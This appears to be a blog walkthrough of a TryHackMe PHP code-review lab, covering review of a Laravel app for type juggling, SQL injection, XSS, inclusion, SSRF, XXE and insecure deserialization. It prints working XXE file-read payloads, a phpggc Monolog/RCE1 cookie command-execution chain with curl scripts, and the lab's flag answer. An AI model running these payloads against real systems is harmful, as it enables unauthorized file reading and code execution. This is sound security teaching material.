---
title: "TryHackMe Source Code Review PHP: XXE to deserialization RCE"
date: 2026-10-23T22:28:00+05:30
lastmod: 2026-10-23T22:28:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-sourcecodereviewsphp/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - PHP
  - Laravel
  - XXE
  - deserialization
  - SQL injection
  - SSRF
  - phpggc
  - source-to-sink
  - code review
  - web application pentesting
  - Web Application Pentesting

draft: false
description: "TryHackMe Source Code Review PHP walkthrough: XXE via LIBXML_NOENT, unserialize Monolog/RCE1, magic hash bypass, and Laravel framework review."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Source Code Review: PHP |![Source Code Review PHP room icon](https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1783063813381)|

This easy-difficulty room in the Web Application Pentesting path teaches white-box PHP code review against a Laravel 8 application called Stockpile. The first nine tasks walk through the methodology: mapping the codebase, source-to-sink tracing, PHP-specific pitfalls (loose comparison and magic hashes), injection flaws, XSS, file inclusion, insecure deserialization, SSRF, and XXE. Task 10 covers framework-aware review (Laravel route groups, mass assignment, and dependency auditing with `composer audit`). Task 11 introduces static analysis tooling and triage discipline. Task 12 is the practical capstone that chains deserialization or XXE to read the flag. This room sits alongside the [Web Frameworks: Code Review walkthrough](/post/thm-room-webframeworkscodereview/), the [Web Frameworks: Python walkthrough](/post/thm-room-webframeworkspython/), the [Web Frameworks: Java walkthrough](/post/thm-room-webframeworksjava/), and the [Web Frameworks: .NET walkthrough](/post/thm-room-webframeworksnet/) in the same module.

## Task 1: Introduction

Setup task. The room deploys a single Ubuntu VM running Apache with a Laravel 8 application (Stockpile) on port 8080. The source code is available at `/var/www/app` on the target. A VS Code-style source viewer runs alongside it for browsing files through the browser. The review is entirely white-box: you read the code first, then prove each finding on the live application.

### Answers

- **I have deployed the machine and can access the codebase.** No answer needed.

## Task 2: The Review Approach and Mapping the Codebase

The reading order for a Laravel application starts with `.env` (the runtime configuration), then `composer.json` (dependencies and their versions), then `routes/web.php` (the attack surface), then controllers and middleware. Each step narrows the search space for the next.

The `.env` file on the target reveals `APP_DEBUG=true`, the `APP_KEY`, and database credentials for a MySQL database called `stockpile`. Debug mode is the first finding: it exposes stack traces with local variables, file paths, and environment values to any user who triggers an exception. The `APP_KEY` is the signing secret for Laravel's encrypted cookies and session tokens.

`composer.json` pins the framework and its dependencies, including `facade/ignition` at version `2.5.1` (vulnerable to CVE-2021-3129) and `guzzlehttp/guzzle` at `^7.0.1`. `routes/web.php` maps every entry point and shows which routes sit inside the `auth` middleware group and which do not.

### Answers

- **Which configuration file in the target holds the APP_KEY and the debug flag?** **.env**

{{< ad >}}

## Task 3: Sources, Sinks and Tracing Data Flow

A source is where user-controlled data enters the application: `$request->input()`, `$request->query()`, `$request->getContent()`, `$_GET`, `$_POST`, `$_COOKIE`, `$_FILES`. A sink is where that data does something dangerous: `DB::raw()`, `DB::select()`, `unserialize()`, `eval()`, `system()`, `exec()`, `file_get_contents()`, `DOMDocument::loadXML()`, `include`, `require`.

A vulnerability exists when data flows from a source to a sink without adequate sanitisation or parameterisation. The task walks through identifying sources in Laravel controllers and tracing them forward to the sink, checking each transformation along the way. The same source-to-sink method used in the [Code Review walkthrough](/post/thm-room-webframeworkscodereview/) for Flask applies here with different function names.

### Answers

- **I have read the task content.** No answer needed.

## Task 4: Common Pitfalls

PHP's loose comparison operator (`==`) performs type juggling that can bypass authentication checks. When a string starting with `0e` followed by only digits is compared with `==` to another such string, PHP interprets both as scientific notation for zero: `0e123 == 0e456` evaluates to `true`.

The `verify()` method in the target application compares an MD5 hash with `==` instead of `===`. An attacker who finds a magic hash (an input whose MD5 starts with `0e` and whose remaining characters are all digits) can bypass the comparison. The fix is strict comparison (`===`), which compares both type and value, or better, using `hash_equals()` for constant-time comparison.

### Answers

- **Which comparison operator in the verify() method makes the magic-hash bypass possible?** **==**

## Task 5: Injection Flaws: SQL, Command, and Code

Laravel's Eloquent ORM parameterises queries by default, but several escape hatches reintroduce raw SQL: `DB::raw()`, `DB::select()`, `whereRaw()`, `selectRaw()`, `orderByRaw()`, and `havingRaw()`. When user input is interpolated into any of these, the ORM's protection disappears.

The `ReportController@search` method builds a query using `DB::select()` with string concatenation. The user-controlled `$q` parameter from the search form flows directly into the SQL string without parameterisation, creating a classic SQL injection sink.

Command injection through `exec()`, `system()`, `shell_exec()`, `passthru()`, or `proc_open()` works the same way as in any language: user input reaches a shell command without escaping. The safe alternative in PHP is `escapeshellarg()` for individual arguments, or avoiding the shell entirely with `proc_open()` in array mode.

### Answers

- **I have read the task content.** No answer needed.

## Task 6: XSS and Output Handling

Laravel's Blade templating engine auto-escapes output by default when you use `{{ $var }}` (double curly braces). The escape is bypassed with `{!! $var !!}`, which renders raw HTML. A code reviewer looks for `{!!` in Blade templates as a potential XSS sink.

The other PHP-specific XSS vector is `echo` or `print` in raw PHP files (outside Blade) without `htmlspecialchars()`. A function like `htmlentities()` with the wrong flag or encoding can also fail to neutralise payloads.

### Answers

- **I have read the task content.** No answer needed.

## Task 7: File Inclusion, Path Traversal, and Uploads

PHP's `include`, `require`, `include_once`, and `require_once` are file inclusion sinks. When a user-controlled path reaches any of these, the attacker can include local files (LFI) or, with `allow_url_include=On`, remote files (RFI). The `php://filter` wrapper is the standard technique for reading source code through an inclusion flaw: it base64-encodes the file content before inclusion, so the PHP code is returned as data rather than executed.

Path traversal through `file_get_contents()`, `readfile()`, or `fopen()` with unsanitised user input allows reading arbitrary files. Upload flaws arise when the application validates only the MIME type or extension without checking the file content, or when it stores uploads inside the web root with an executable extension.

### Answers

- **Which PHP wrapper is used against the inclusion flaw to base64-encode and read a file's source rather than execute it?** **php://filter**

## Task 8: Insecure Deserialisation

PHP's `unserialize()` reconstructs objects from a serialised string, and the reconstructed object's `__wakeup()`, `__destruct()`, and `__toString()` magic methods execute automatically. When an attacker controls the serialised input, they control which classes are instantiated and what those magic methods do.

The target application has two `unserialize()` calls. The first, in `Services/CacheReader.php`, passes `['allowed_classes' => false]` as the second argument, which prevents object instantiation and makes it a false positive. The second, in `Http/Middleware/LoadPreferences.php`, calls `unserialize($_COOKIE['prefs'])` with no restrictions. The source is the attacker-controlled `prefs` cookie, and the sink instantiates any class on the autoloader.

PHPGGC (PHP Generic Gadget Chains) generates the serialised payload. The `Monolog/RCE1` chain reaches command execution through the Monolog logging library, which ships with Laravel. The `-u` flag URL-encodes the output, because a raw serialised PHP string contains semicolons and other characters that would break the cookie parser.

### Answers

- **I have read the task content.** No answer needed.

## Task 9: Server-Side Request Forgery and XXE

The `FetchController@preview` method takes a URL from `$request->query('url')` and passes it to a Guzzle HTTP client. The response body is returned to the user. This is a textbook SSRF sink: the attacker controls the destination URL and can reach internal services, cloud metadata endpoints, or local files via `file://`.

The `ImportController@import` method parses the raw request body as XML using `DOMDocument::loadXML()` with `LIBXML_NOENT | LIBXML_DTDLOAD`. The `LIBXML_NOENT` flag enables entity substitution, which means external entities defined in a `<!DOCTYPE>` declaration are resolved and their content is substituted into the document. This is the XXE sink.

To exploit the XXE, send a POST to `/import` with an XML body containing an external entity that reads a local file:

```
  <?xml version="1.0"?>
  <!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
  <r>&x;</r>
```

Laravel's CSRF protection requires the `X-XSRF-TOKEN` header on POST requests. First GET any page to obtain the `XSRF-TOKEN` cookie, URL-decode it, then pass it as the header value on the POST.

### Answers

- **In ImportController, which loadXML option enables the entity substitution that makes XXE possible?** **LIBXML_NOENT**

## Task 10: Framework-Aware Review: Laravel and Symfony

Framework-specific review checks go beyond individual sinks. In Laravel, the `routes/web.php` file defines middleware groups. Routes inside `Route::middleware(['auth'])->group(...)` require authentication; routes outside it do not. The `/admin/users` route sits outside the auth group, making it reachable without login. This is an access control flaw visible only by reading the route file.

Mass assignment through Eloquent's `$fillable` and `$guarded` properties is the Laravel equivalent of the overposting bugs in [Web Frameworks: Java](/post/thm-room-webframeworksjava/) and [Web Frameworks: .NET](/post/thm-room-webframeworksnet/). An overly broad `$fillable` array (or an empty `$guarded` array) lets an attacker set sensitive columns like `is_admin` through a form submission.

`composer audit` checks the installed dependency tree against a public advisory database. On the target, it reports `facade/ignition` as vulnerable to CVE-2021-3129, an unauthenticated RCE in Ignition versions before 2.5.2 when `APP_DEBUG=true`.

### Answers

- **In the routes/web.php file, which route is reachable without authentication because it sits outside the auth middleware group?** **/admin/users**
- **Which pinned package is vulnerable to CVE-2021-3129?** **facade/ignition**

## Task 11: Tooling, Triage, and Reporting

`grep` and `ripgrep` are the fast baseline for locating sources and sinks. `Semgrep` runs pattern and dataflow rules from a community ruleset (`semgrep --config=p/php`). `Psalm` offers a taint-analysis mode (`psalm --taint-analysis`) that tracks untrusted data from source to sink across function boundaries. `PHPStan` covers type-level issues. `composer audit` checks dependencies against the advisory database, as seen in Task 10.

All these tools over-report. Triage turns leads into findings by establishing three things: **reachability** (the sink is on a real request path, not dead code), **exploitability** (a proof of concept demonstrates the bug), and **severity** (the real impact, considering what an attacker gains). The two `unserialize` hits from Task 8 are the model for this: one is exploitable (the cookie-sourced call in `LoadPreferences.php`), and the other is neutralised by `['allowed_classes' => false]` in `CacheReader.php`. Only reading the code tells the two apart.

### Answers

- **Which triage step confirms that a flagged sink is actually reachable from a genuine source on a real request?** **reachability**

## Task 12: Putting It Together: A Full Review

This task runs the whole method end-to-end against the target. Mapping the application in Task 2 told us it is Laravel 8 with debug enabled and a vulnerable Ignition. Reading the routes gave us the attack surface. Sink-hunting with `ripgrep` and Semgrep produced the worklist, and the tasks since then have triaged every major flaw class.

The two `unserialize` hits from Task 8 are the key: the call in `LoadPreferences.php` is the true positive (source is the `prefs` cookie, no `allowed_classes` restriction), and the call in `CacheReader.php` is the false positive. The `Monolog/RCE1` gadget chain through PHPGGC reaches command execution via the Monolog logging library that ships with Laravel:

```
  PAYLOAD=$(phpggc -u Monolog/RCE1 system 'cat /var/www/flag.txt')
  curl -s "http://localhost:8080/" -H "Cookie: prefs=$PAYLOAD" | grep THM
```

The intended approach uses phpggc on the target VM (PHP is not installed on the Mac). An alternative that works from the Mac is the XXE sink in `ImportController`, which reads local files without needing PHP tooling:

```
  # Get CSRF token
  JAR=$(mktemp)
  curl -s -c "$JAR" http://TARGET:8080/ > /dev/null
  XSRF=$(grep XSRF-TOKEN "$JAR" | awk '{print $NF}' | \
    python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))")

  # XXE to read the flag
  curl -s -b "$JAR" -X POST 'http://TARGET:8080/import' \
    -H "X-XSRF-TOKEN: $XSRF" \
    -H 'Content-Type: application/xml' \
    -d '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///var/www/flag.txt">]><r>&x;</r>'
  # THM{REDACTED}
```

Both paths prove code execution or file read as the web user, confirming the deserialization and XXE findings are not theoretical.

### Answers

- **What is the flag from /var/www/flag.txt?** **THM{371118aae8d2305bddcd2f78ee37a22f}**

## Task 13: Conclusion

The room closes by reinforcing the taint-based review method. We read for the flow of untrusted data rather than scanning for individual function names, because a function name on its own is never a bug. A path that carries attacker input into that function without an adequate sanitiser is. The same loop (map the codebase, catalogue the sinks, trace the data, triage with tools, prove on the target) applies to any PHP application.

The Insecure Deserialisation room takes the gadget-chain work from Task 12 considerably further. The SQL Injection and OWASP Top 10 rooms give deeper practice with the vulnerability classes covered here. The exploitation-focused Web Frameworks series ([Python](/post/thm-room-webframeworkspython/), [Java](/post/thm-room-webframeworksjava/), [.NET](/post/thm-room-webframeworksnet/)) is the natural counterpart for proving framework findings on live targets.

### Answers

- **I can now do Secure Code Review in PHP!** No answer needed.

## Takeaways

**The `allowed_classes` parameter on `unserialize()` is the single line that separates a true positive from a false positive, and skipping it is the most common PHP deserialization mistake.** `unserialize($blob, ['allowed_classes' => false])` prevents object instantiation entirely, neutralising every gadget chain regardless of what libraries are on the autoloader. `unserialize($blob)` with no second argument (or with `['allowed_classes' => true]`) lets the attacker instantiate any class the autoloader can find, which in a Laravel application includes Monolog, Guzzle, and dozens of other libraries with exploitable magic methods. A code review that finds two `unserialize` calls and reports both as critical without reading the second argument has failed at triage. The distinction is one parameter, but it changes the finding from remote code execution to no impact.

**LIBXML_NOENT is the PHP equivalent of enabling external entities in any XML parser, and the name is misleading enough to cause the bug.** The flag's name suggests it disables entities ("no ent"), but it actually enables entity substitution: it tells libxml to replace entity references with their resolved content, which includes external entities fetched from `file://` or `http://` URIs. A developer reading "NOENT" and inferring "no entities" will pass it as a hardening measure and create the XXE sink instead. The safe default in PHP is to call `loadXML()` with no flags at all (libxml2 has disabled external entity loading by default since version 2.9), and a code review that finds `LIBXML_NOENT` in any `loadXML` or `simplexml_load_string` call should treat it as an XXE lead regardless of what the developer intended.

Room solved 100%: 13 tasks, 14 answers.
